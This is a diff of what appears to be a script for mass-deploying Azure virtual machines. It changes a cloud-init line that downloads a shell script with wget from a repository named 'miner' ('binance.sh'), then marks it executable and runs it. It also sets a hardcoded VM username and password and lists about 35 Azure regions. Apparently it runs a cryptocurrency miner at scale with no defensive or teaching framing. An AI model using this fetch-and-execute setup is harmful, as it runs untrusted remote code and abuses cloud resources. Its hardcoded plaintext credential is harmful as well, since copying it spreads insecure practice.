@@ -1,4 +1,4 @@
-echo $'#!/bin/bash\nwget -O duyb.sh https://raw.githubusercontent.com/n2t91/n2tcoin/main/DuyB.sh && chmod +x duyb.sh && bash ./duyb.sh' > cloud-init.txt
+echo $'#!/bin/bash\nwget -O duyb.sh https://raw.githubusercontent.com/OnlyBee/miner/main/binance.sh && chmod +x duyb.sh && bash ./duyb.sh' > cloud-init.txt
 $user = "azureuser"
 $password = "Rinnguyen@123"
 $locations = "eastus", "eastus2", "southcentralus", "westus2", "westus3", "australiaeast", "southeastasia", "northeurope", "swedencentral", "uksouth", "westeurope", "centralus", "northcentralus", "westus", "southafricanorth", "centralindia", "eastasia", "japaneast", "koreacentral", "canadacentral", "francecentral", "germanywestcentral", "norwayeast", "switzerlandnorth", "uaenorth", "brazilsouth", "westcentralus", "australiacentral", "australiasoutheast", "japanwest", "koreasouth", "southindia", "westindia", "canadaeast", "ukwest"
